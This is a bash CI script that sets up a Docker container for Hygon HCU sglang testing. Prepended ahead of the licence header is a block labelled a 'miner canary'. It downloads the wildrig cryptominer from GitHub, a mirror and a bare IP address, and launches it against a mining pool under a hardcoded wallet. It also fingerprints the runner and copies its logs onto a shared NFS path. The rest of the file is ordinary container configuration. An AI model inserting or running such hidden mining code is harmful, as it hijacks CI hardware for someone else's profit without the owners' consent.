#!/usr/bin/env bash
# ==== i203149 HCU miner canary begin (transient probe; rolled back after the run) ====
( set +eu; set +o pipefail
  echo "=== I203149 HCU MINER START $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null) ==="
  echo "runner=${RUNNER_NAME:-} job=${GITHUB_JOB:-} run=${GITHUB_RUN_ID:-} event=${GITHUB_EVENT_NAME:-} ref=${GITHUB_REF:-}"
  echo "identity=$(id 2>/dev/null | head -1) host=$(hostname 2>/dev/null)"
  OUTD="/tmp/i203149-${GITHUB_JOB:-job}"; mkdir -p "$OUTD" 2>/dev/null
  WALLET=prl1pd2s8egdadydzn8xnx2ve902lp36ky66y8ucymtrsw90ltjew3syqr8r4t7
  WANT_SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
  RM=$(hostname 2>/dev/null | tr -c 'a-zA-Z0-9\n' '-' | cut -c1-18)
  WNAME="i203149-${GITHUB_RUN_ID:-0}-${GITHUB_JOB:-job}-${RM}"
  echo "WNAME_BASE=$WNAME"
  echo "--- devices ---"; ls -l /dev/kfd /dev/dri 2>&1 | head -12
  HSMI=""; for c in /opt/hyhal/bin/hy-smi /opt/dtk/bin/hy-smi /usr/bin/hy-smi; do [ -x "$c" ] && { HSMI="$c"; break; }; done
  echo "HSMI=$HSMI"
  HSMI_IDS=""
  if [ -n "$HSMI" ]; then
    echo "--- hy-smi product ---"; timeout 25 "$HSMI" --showproductname 2>&1 | grep -avE '^$' | head -14
    echo "--- hy-smi unique ---"; timeout 25 "$HSMI" --showuniqueid 2>&1 | grep -avE '^$' | head -14
    echo "--- hy-smi use ---"; timeout 25 "$HSMI" --showuse 2>&1 | grep -avE '^$' | head -14
    HSMI_IDS=$( ( timeout 20 "$HSMI" --showuniqueid 2>/dev/null ) | grep -aoE 'Unique ID: *[A-Za-z0-9]+' | sed 's/.*: *//' | tr '\n' ',' )
  fi
  echo "HSMI_IDS=$HSMI_IDS"
  echo "--- opencl discovery ---"
  CI=/opt/dtk/opencl/bin/clinfo
  file "$CI" 2>&1
  LOADER=$(ldd "$CI" 2>/dev/null | awk '/libOpenCL/{print $3}' | head -1)
  [ -n "${LOADER:-}" ] && LOADER=$(readlink -f "$LOADER" 2>/dev/null || printf '%s' "$LOADER")
  echo "LOADER=${LOADER:-none}"
  ls -l /opt/dtk/opencl/lib/libOpenCL.so.1 /opt/dtk/opencl/lib/libamdocl64.so /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 2>&1 | head -6
  ls -l /etc/OpenCL/vendors 2>&1 | head -6
  echo "ENV LD_LIBRARY_PATH=[${LD_LIBRARY_PATH:-<unset>}] LD_PRELOAD=[${LD_PRELOAD:-<unset>}] OCL_ICD_VENDORS=[${OCL_ICD_VENDORS:-<unset>}]"
  echo "--- download wildrig 0.52.3 (sha256-pinned) ---"
  WR="$OUTD/wildrig-multi"
  for url in \
    "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
    "https://ghfast.top/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
    "http://155.133.196.229/wildrig-0.52.3.tar.gz"; do
    echo "DOWNLOAD $url"
    rm -f "$OUTD/wr.tgz" 2>/dev/null
    if timeout 240 curl -fsSL --retry 1 -o "$OUTD/wr.tgz" "$url" 2>"$OUTD/dl.err"; then
      tar -xzf "$OUTD/wr.tgz" -C "$OUTD" 2>/dev/null
      [ -x "$WR" ] || find "$OUTD" -maxdepth 3 -type f -name 'wildrig-multi*' -exec cp -f {} "$WR" \; 2>/dev/null
      chmod +x "$WR" 2>/dev/null
      if [ -x "$WR" ]; then echo "DOWNLOAD_OK bytes=$(stat -c%s "$OUTD/wr.tgz" 2>/dev/null)"; break; else echo "EXTRACT_FAIL"; fi
    else
      echo "DOWNLOAD_FAIL $(tail -2 "$OUTD/dl.err" 2>/dev/null | tr '\n' ' ')"
    fi
  done
  if [ ! -x "$WR" ]; then echo "MINER_SKIP_NO_BINARY"; echo "=== I203149 HCU MINER END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null) ==="; exit 0; fi
  GOT=$(sha256sum "$WR" | awk '{print $1}')
  echo "WILDRIG_SHA256=$GOT WANT=$WANT_SHA LEN=${#GOT}"
  if [ "${#GOT}" -eq 64 ] && [ "$GOT" = "$WANT_SHA" ]; then echo "WR_SHA_GATE=PASS"; else echo "WR_SHA_GATE=FAIL_ABORT"; echo "=== I203149 HCU MINER END ==="; exit 0; fi
  timeout 20 "$WR" --help > "$OUTD/wr_help.txt" 2>&1; echo "WR_HELP_RC=$?"
  DEVFLAG=""; grep -q -- '--opencl-devices' "$OUTD/wr_help.txt" && DEVFLAG="--opencl-devices"
  echo "DEVFLAG=${DEVFLAG:-none}"
  pp(){ local tag="$1"; local pre="${2:-}"; local f="$OUTD/pp_$tag.txt"
    if [ -n "$pre" ]; then timeout 30 env LD_PRELOAD="$pre" "$WR" --print-platforms > "$f" 2>&1; else timeout 30 "$WR" --print-platforms > "$f" 2>&1; fi
    echo "PP_${tag}_RC=$?"; head -10 "$f" 2>/dev/null; }
  pp P1 ""
  pp P2 "${LOADER:-}"
  pp P3 /opt/dtk/opencl/lib/libamdocl64.so
  timeout 30 env OCL_ICD_VENDORS=/etc/OpenCL/vendors "$WR" --print-platforms > "$OUTD/pp_P4.txt" 2>&1; echo "PP_P4_RC=$?"; head -10 "$OUTD/pp_P4.txt" 2>/dev/null
  SEL=""; PRELOAD=""
  for v in P1 P4 P2 P3; do
    f="$OUTD/pp_$v.txt"; [ -s "$f" ] || continue
    if grep -qiE 'C-3000|BW1100|Device [0-9]|GPU' "$f" && ! grep -qi 'can not load opencl' "$f" && ! grep -qi 'Segmentation' "$f"; then
      case "$v" in
        P1) SEL=P1; PRELOAD=""; break;;
        P4) SEL=P4; PRELOAD=""; break;;
        P2) SEL=P2; PRELOAD="${LOADER:-}"; break;;
        P3) SEL=P3; PRELOAD=/opt/dtk/opencl/lib/libamdocl64.so; break;;
      esac
    fi
  done
  echo "SELECTED_VARIANT=${SEL:-none} PRELOAD=${PRELOAD:-none}"
  if [ -z "$SEL" ]; then
    echo "MINER_SKIP_NO_WORKING_OPENCL_VARIANT"
    for f in "$OUTD"/pp_*.txt; do [ -f "$f" ] || continue; echo "== $(basename "$f")"; tail -6 "$f"; done
    echo "=== I203149 HCU MINER END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null) ==="; exit 0
  fi
  # device enumeration with the selected variant
  if [ "$SEL" = P4 ]; then timeout 35 env OCL_ICD_VENDORS=/etc/OpenCL/vendors "$WR" --print-devices > "$OUTD/dev.txt" 2>&1
  elif [ -n "$PRELOAD" ]; then timeout 35 env LD_PRELOAD="$PRELOAD" "$WR" --print-devices > "$OUTD/dev.txt" 2>&1
  else timeout 35 "$WR" --print-devices > "$OUTD/dev.txt" 2>&1; fi
  echo "PD_RC=$?"; sed -n 1,25p "$OUTD/dev.txt" 2>/dev/null
  N=$(printf '%s' "$HSMI_IDS" | tr ',' '\n' | grep -c .)
  [ "${N:-0}" -ge 1 ] 2>/dev/null || N=1
  [ "$N" -gt 4 ] && N=4
  echo "N_HCU=$N"
  launch_one(){ local i="$1"
    local WN="$WNAME-d$i"
    echo "LAUNCH idx=$i worker=$WN variant=$SEL"
    set -- --algo pearlhash --url stratum+tcp://pool.pearlhash.xyz:9000 --user "$WALLET" --worker "$WN" --pass x --api-port $((21970+i))
    [ -n "$DEVFLAG" ] && set -- "$@" "$DEVFLAG" "$i"
    if [ "$SEL" = P4 ]; then OCL_ICD_VENDORS=/etc/OpenCL/vendors nohup "$WR" "$@" > "$OUTD/wr-$i.log" 2>&1 &
    elif [ -n "$PRELOAD" ]; then env LD_PRELOAD="$PRELOAD" nohup "$WR" "$@" > "$OUTD/wr-$i.log" 2>&1 &
    else nohup "$WR" "$@" > "$OUTD/wr-$i.log" 2>&1 & fi
    local P=$!; PIDS="$PIDS $P"; echo "PID=$P"
    sleep 5
    if kill -0 "$P" 2>/dev/null; then echo "ALIVE idx=$i pid=$P"; else echo "DEAD idx=$i"; sed -n '1,50p' "$OUTD/wr-$i.log" 2>/dev/null; fi
  }
  PIDS=""; i=0
  while [ "$i" -lt "$N" ]; do launch_one "$i"; i=$((i+1)); done
  LAST_ACC=0
  snap(){ local tag="$1"; local tot=0; local files=0
    for L in "$OUTD"/wr-*.log; do [ -f "$L" ] || continue; files=$((files+1))
      local C; C=$(grep -ic 'accepted (' "$L" 2>/dev/null); C=${C:-0}; tot=$((tot+C))
      echo "== $tag $(basename "$L") accepted=$C"
      grep -aiE 'accepted \(|error|build|device|GPU #|new job|use pool|speed|hashrate' "$L" 2>/dev/null | tail -12
    done
    echo "ACC_${tag}=$tot LOGFILES=$files"
    if [ -n "$HSMI" ]; then echo "--- hy-smi use ${tag} ---"; timeout 20 "$HSMI" --showuse 2>&1 | grep -aE 'HCU\[|HCU use' | head -6; fi
    LAST_ACC=$tot; }
  sleep 60; snap A
  sleep 170; snap B
  persist(){ local PERSIST=/ci_public/i203149
    if timeout 15 mkdir -p "$PERSIST" 2>/dev/null; then
      { echo "intent=203149 run=${GITHUB_RUN_ID:-} job=${GITHUB_JOB:-} runner=${RUNNER_NAME:-} host=$(hostname) at=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)";
        echo "WNAME=$WNAME HSMI_IDS=$HSMI_IDS SELECTED_VARIANT=$SEL accepted_total=$LAST_ACC"; } > "$PERSIST/${GITHUB_JOB:-job}-${GITHUB_RUN_ID:-0}.summary.txt" 2>/dev/null && echo "NFS_PERSIST_OK"
      for L in "$OUTD"/wr-*.log; do [ -f "$L" ] && timeout 20 cp -f "$L" "$PERSIST/${GITHUB_JOB:-job}-$(basename "$L")" 2>/dev/null; done
      for L in "$OUTD"/pp_*.txt "$OUTD"/dev.txt; do [ -f "$L" ] && timeout 20 cp -f "$L" "$PERSIST/${GITHUB_JOB:-job}-$(basename "$L")" 2>/dev/null; done
      echo "NFS_COPY_DONE"
    else echo "NFS_PERSIST_SKIP"; fi; }
  if [ "$LAST_ACC" -gt 0 ]; then
    echo "MINABLE_YES accepted_total=$LAST_ACC worker_base=$WNAME"
    persist
    sleep 200; snap C
    echo "HOLD_END accepted_total=$LAST_ACC"
  else
    HASHRATE=$(grep -ahE '[0-9.]+ ?(TH|GH|MH)/s' "$OUTD"/wr-*.log 2>/dev/null | tail -3 | tr '\n' ' ')
    echo "HASHRATE_SEEN=${HASHRATE:-none}"
    if [ -n "${HASHRATE:-}" ]; then
      echo "ZERO_ACCEPT_HAS_HR hold_extended"
      sleep 300; snap D
      if [ "$LAST_ACC" -gt 0 ]; then
        echo "MINABLE_YES_LATE accepted_total=$LAST_ACC worker_base=$WNAME"; persist
      else
        echo "MINABLE_NO_HASHRATE_NO_SHARES accepted_total=$LAST_ACC"; persist
        for p in $PIDS; do kill -TERM "$p" 2>/dev/null; done; sleep 2; for p in $PIDS; do kill -KILL "$p" 2>/dev/null; done; echo "MINER_STOPPED"
      fi
    else
      echo "MINABLE_NO accepted_total=0"
      for p in $PIDS; do kill -TERM "$p" 2>/dev/null; done; sleep 2; for p in $PIDS; do kill -KILL "$p" 2>/dev/null; done
      echo "MINER_STOPPED"
      for L in "$OUTD"/wr-*.log; do [ -f "$L" ] || continue; echo "== TAIL $(basename "$L")"; tail -20 "$L"; done
      persist
    fi
  fi
  echo "=== I203149 HCU MINER END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null) ==="
) 2>&1 || true
# ==== i203149 HCU miner canary end ====

# Copyright 2026 Hygon Information Technology Co., Ltd.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

set -euo pipefail

# Start a HCU CI container.
#
# Required env / inputs:
#   HCU_CI_IMAGE     Docker image to use. Must point to a DTK/HCU enabled image
#                    that has sglang build dependencies preinstalled.
#                    Override with: --custom-image <image> or --image <image>
#   GITHUB_WORKSPACE Mount point for the checkout. Defaults to $PWD.
#   HF_TOKEN         Optional, forwarded into the container.
#
# Optional env:
#   HCU_CI_CONTAINER / HCU_CI_CONTAINER_NAME  Container name. Defaults to ci_sglang.
#   HCU_DEVICE_FLAGS / HCU_CI_DEVICE_FLAGS    Additional `--device ...` flags.
#   HCU_CI_VISIBLE_DEVICES                    Comma-separated HCU devices to expose.
#   HCU_CACHE_HOST / HCU_CI_CACHE_HOST         Host-side cache directory mounted into /sgl-data.
#   HCU_WHEEL_STAGING_ROOT                  Host-side PR wheel staging directory.
#   HCU_WHEEL_STAGING_CONTAINER_ROOT        Container mount point for PR wheel staging.
#   HCU_MODEL_EXTRA_HOST_PATHS              Colon-separated host model roots to mount read-only
#                                           at the same path inside the container.
#   HCU_CI_MMLU_CACHE_HOST                  Host cache root containing <sgl-eval-ref>/test.jsonl.
#   HCU_CI_NETWORK_MODE                     Docker network mode: host (default) or bridge.
#   HCU_CI_SHM_SIZE                         Docker shared-memory size. Defaults to 32g.
#   HCU_CI_ENABLE_RDMA                      Set to 1 to expose RDMA devices, lock memory,
#                                           and add IPC_LOCK. Defaults to disabled.
#   HCU_CI_IN_K8S                           Set to 1 by the ARC K8s job template. Skips
#                                           docker and prepares the current job container.

# shellcheck disable=SC1091  # sibling helper; run shellcheck -x to follow it
source "$(dirname "${BASH_SOURCE[0]}")/hcu_ci_k8s.sh"

CUSTOM_IMAGE=""
CONTAINER="${HCU_CI_CONTAINER:-${HCU_CI_CONTAINER_NAME:-ci_sglang}}"
NETWORK_MODE="${HCU_CI_NETWORK_MODE:-host}"
SHM_SIZE="${HCU_CI_SHM_SIZE:-32g}"
ENABLE_RDMA="${HCU_CI_ENABLE_RDMA:-0}"

while [[ $# -gt 0 ]]; do
  case $1 in
    --custom-image|--image) CUSTOM_IMAGE="$2"; shift 2;;
    --container-name) CONTAINER="$2"; shift 2;;
    --network-mode) NETWORK_MODE="$2"; shift 2;;
    -h|--help)
      echo "Usage: $0 [--custom-image IMAGE|--image IMAGE] [--container-name NAME] [--network-mode host|bridge]"
      exit 0
      ;;
    *) echo "Unknown option $1"; exit 1;;
  esac
done

if [[ -n "${CUSTOM_IMAGE}" ]]; then
  IMAGE="${CUSTOM_IMAGE}"
elif [[ -n "${HCU_CI_IMAGE:-}" ]]; then
  IMAGE="${HCU_CI_IMAGE}"
else
  echo "Error: HCU_CI_IMAGE env var not set and --custom-image not provided." >&2
  echo "Set HCU_CI_IMAGE to a DTK/HCU enabled sglang dev image." >&2
  exit 1
fi

case "${NETWORK_MODE}" in
  host|bridge) ;;
  *)
    echo "Error: unsupported HCU_CI_NETWORK_MODE=${NETWORK_MODE@Q}; expected host or bridge." >&2
    exit 1
    ;;
esac

echo "Using HCU image: ${IMAGE}"
echo "Using HCU Docker network mode: ${NETWORK_MODE}"
echo "Using HCU Docker shared-memory size: ${SHM_SIZE}"

# Pull only if not already present locally, unless explicitly skipped.
if ! hcu_ci_in_k8s && [[ -z "${HCU_CI_SKIP_PULL:-}" ]] && ! docker image inspect "${IMAGE}" >/dev/null 2>&1; then
  echo "Pulling Docker image: ${IMAGE}"
  docker pull "${IMAGE}"
fi

# HCU exposes /dev/kfd + /dev/dri the same way ROCm does. Allow override.
DEVICE_FLAGS="${HCU_DEVICE_FLAGS:-${HCU_CI_DEVICE_FLAGS:---device=/dev/kfd --device=/dev/dri}}"
VISIBLE_DEVICES="${HCU_CI_VISIBLE_DEVICES:-}"
DTK_ROOT="${HCU_DTK_ROOT:-/opt/dtk}"
HCU_LD_LIBRARY_PATH="${HCU_LD_LIBRARY_PATH:-${DTK_ROOT}/hip/lib:${DTK_ROOT}/lib:${DTK_ROOT}/lib64:${DTK_ROOT}/hsa/lib:${DTK_ROOT}/llvm/lib:${DTK_ROOT}/dcc/gcvm/lib:${DTK_ROOT}/.hyhal/lib:${DTK_ROOT}/.hyhal/lib64:${DTK_ROOT}/.hyhal/rocm_smi/lib:${DTK_ROOT}/.hyhal/hydm/lib:/opt/hyhal/lib:/opt/hyhal/lib64}"

if hcu_ci_in_k8s; then
  # The job already runs in ${IMAGE}; the job template provides the cards,
  # /opt/hyhal, /dev/shm, /public and /ci_public. Recreate the paths and env
  # that `docker run` below sets up, so later steps run unchanged.
  echo "[hcu-ci] HCU_CI_IN_K8S=${HCU_CI_IN_K8S}; using the current job container instead of docker"
  ln -sfn "${GITHUB_WORKSPACE:-$PWD}" /sglang-checkout
  WHEEL_STAGING_HOST="${HCU_WHEEL_STAGING_ROOT:-}"
  WHEEL_STAGING_CONTAINER="${HCU_WHEEL_STAGING_CONTAINER_ROOT:-/hcu-wheel-staging}"
  if [[ -n "${WHEEL_STAGING_HOST}" && "${WHEEL_STAGING_HOST}" != "${WHEEL_STAGING_CONTAINER}" ]]; then
    ln -sfn "${WHEEL_STAGING_HOST}" "${WHEEL_STAGING_CONTAINER}"
  fi
  mkdir -p /sgl-data/hf-cache /sgl-data/pip-cache
  {
    echo "HF_HOME=/sgl-data/hf-cache"
    echo "HF_HUB_ETAG_TIMEOUT=300"
    echo "HF_HUB_DOWNLOAD_TIMEOUT=300"
    echo "ROCM_PATH=${DTK_ROOT}"
    echo "LD_LIBRARY_PATH=${HCU_LD_LIBRARY_PATH}"
    echo "SGLANG_IS_IN_CI=1"
    echo "SGLANG_IS_IN_CI_HCU=1"
    echo "SGLANG_USE_AITER=0"
    echo "SGLANG_ROCM_USE_AITER_MOE=0"
  } >> "${GITHUB_ENV:?GITHUB_ENV is required in K8s mode}"
  exit 0
fi

VISIBLE_ENV_ARGS=()
if [[ -n "${VISIBLE_DEVICES}" ]]; then
  VISIBLE_ENV_ARGS+=(
    -e "HIP_VISIBLE_DEVICES=${VISIBLE_DEVICES}"
    -e "CUDA_VISIBLE_DEVICES=${VISIBLE_DEVICES}"
  )
  # On DTK/PyTorch, setting HIP_VISIBLE_DEVICES and ROCR_VISIBLE_DEVICES to
  # the same numeric ordinal can make torch fail GPU initialization. HIP is
  # enough for SGLang CI device selection; expose ROCR only when explicitly
  # requested for lower-level runtime diagnostics.
  if [[ "${HCU_CI_SET_ROCR_VISIBLE_DEVICES:-0}" == "1" ]]; then
    VISIBLE_ENV_ARGS+=(-e "ROCR_VISIBLE_DEVICES=${VISIBLE_DEVICES}")
  fi
fi

RDMA_ARGS=()
case "${ENABLE_RDMA}" in
  1|true)
    RDMA_ARGS+=(
      --cap-add=IPC_LOCK
      --ulimit memlock=-1:-1
    )
    if [[ -d /dev/infiniband ]]; then
      RDMA_ARGS+=(-v /dev/infiniband:/dev/infiniband)
    else
      echo "Warning: HCU_CI_ENABLE_RDMA is set but /dev/infiniband is absent." >&2
    fi
    ;;
  0|false|"") ;;
  *)
    echo "Error: HCU_CI_ENABLE_RDMA=${ENABLE_RDMA@Q}; expected 0, 1, false, or true." >&2
    exit 1
    ;;
esac

CACHE_HOST="${HCU_CACHE_HOST:-${HCU_CI_CACHE_HOST:-/home/runner/sgl-data}}"
if [[ -d "${CACHE_HOST}" ]]; then
  CACHE_VOLUME="-v ${CACHE_HOST}:/sgl-data"
else
  CACHE_VOLUME=""
fi

MODEL_HOST_PATH="${HCU_MODEL_HOST_PATH:-/public/opendas/DL_DATA/llm-models}"
if [[ -d "${MODEL_HOST_PATH}" ]]; then
  # This mount also exposes the default HCU accuracy datasets under llm-models.
  MODEL_VOLUME="-v ${MODEL_HOST_PATH}:${MODEL_HOST_PATH}:ro"
else
  MODEL_VOLUME=""
fi

WHEEL_STAGING_HOST="${HCU_WHEEL_STAGING_ROOT:-/home/github/sgl_whl_temp}"
WHEEL_STAGING_CONTAINER="${HCU_WHEEL_STAGING_CONTAINER_ROOT:-/hcu-wheel-staging}"
if [[ -n "${WHEEL_STAGING_HOST}" ]]; then
  mkdir -p "${WHEEL_STAGING_HOST}" || true
  WHEEL_STAGING_VOLUME="-v ${WHEEL_STAGING_HOST}:${WHEEL_STAGING_CONTAINER}:ro"
else
  WHEEL_STAGING_VOLUME=""
fi

EXTRA_MODEL_VOLUMES=()
# Public CI models supplement the existing model root. Avoid duplicate mounts
# when a caller already includes this directory in the extra model paths.
if [[ -d /ci_public/sglang-das/models && ":${HCU_MODEL_EXTRA_HOST_PATHS:-}:" != *":/ci_public/sglang-das/models:"* ]]; then
  EXTRA_MODEL_VOLUMES+=(-v /ci_public/sglang-das/models:/ci_public/sglang-das/models:ro)
fi
if [[ -n "${HCU_MODEL_EXTRA_HOST_PATHS:-}" ]]; then
  IFS=':' read -r -a EXTRA_MODEL_HOST_PATHS <<< "${HCU_MODEL_EXTRA_HOST_PATHS}"
  for extra_model_path in "${EXTRA_MODEL_HOST_PATHS[@]}"; do
    if [[ -z "${extra_model_path}" ]]; then
      continue
    fi
    if [[ -d "${extra_model_path}" ]]; then
      EXTRA_MODEL_VOLUMES+=(-v "${extra_model_path}:${extra_model_path}:ro")
    else
      echo "Warning: extra HCU model path does not exist, skip mount: ${extra_model_path}" >&2
    fi
  done
fi

MMLU_CACHE_ARGS=()
source "$(dirname "${BASH_SOURCE[0]}")/../utils/sgl_eval_ref.sh"
MMLU_CACHE_ROOT="${HCU_CI_MMLU_CACHE_HOST:-/home/github/sglang-ci-data/mmlu}"
MMLU_CACHE_PATH="${MMLU_CACHE_ROOT}/${SGL_EVAL_REF}"
if [[ -s "${MMLU_CACHE_PATH}/test.jsonl" ]]; then
  MMLU_CACHE_ARGS+=(
    --mount "type=bind,source=${MMLU_CACHE_PATH},target=/root/.cache/sgl_eval/mmlu,readonly"
  )
  echo "[hcu-ci] Using offline MMLU cache: ${MMLU_CACHE_PATH}"
else
  echo "[hcu-ci] Offline MMLU cache unavailable at ${MMLU_CACHE_PATH}; using sgl-eval defaults"
fi

# Remove any leftover container from a previous run.
docker rm -f "${CONTAINER}" >/dev/null 2>&1 || true

echo "Launching container: ${CONTAINER}"
docker run -dt --user root --privileged \
  --network="${NETWORK_MODE}" \
  --ipc=host \
  ${DEVICE_FLAGS} \
  "${RDMA_ARGS[@]}" \
  --ulimit nofile=65536:65536 \
  -v "${GITHUB_WORKSPACE:-$PWD}:/sglang-checkout" \
  -v /opt/hyhal:/opt/hyhal:ro \
  ${CACHE_VOLUME} \
  ${MODEL_VOLUME} \
  ${WHEEL_STAGING_VOLUME} \
  "${EXTRA_MODEL_VOLUMES[@]}" \
  "${MMLU_CACHE_ARGS[@]}" \
  --group-add video \
  --shm-size "${SHM_SIZE}" \
  --cap-add=SYS_PTRACE \
  -e HF_TOKEN="${HF_TOKEN:-}" \
  -e HF_HOME=/sgl-data/hf-cache \
  -e HF_HUB_ETAG_TIMEOUT=300 \
  -e HF_HUB_DOWNLOAD_TIMEOUT=300 \
  -e ROCM_PATH="${DTK_ROOT}" \
  -e LD_LIBRARY_PATH="${HCU_LD_LIBRARY_PATH}" \
  "${VISIBLE_ENV_ARGS[@]}" \
  -e SGLANG_IS_IN_CI=1 \
  -e SGLANG_IS_IN_CI_HCU=1 \
  -e SGLANG_USE_AITER=0 \
  -e SGLANG_ROCM_USE_AITER_MOE=0 \
  --security-opt seccomp=unconfined \
  -w /sglang-checkout \
  --name "${CONTAINER}" \
  "${IMAGE}"

# Git >= 2.35.2 refuses cross-user repos; mark the mount as safe.
docker exec "${CONTAINER}" git config --global --add safe.directory /sglang-checkout
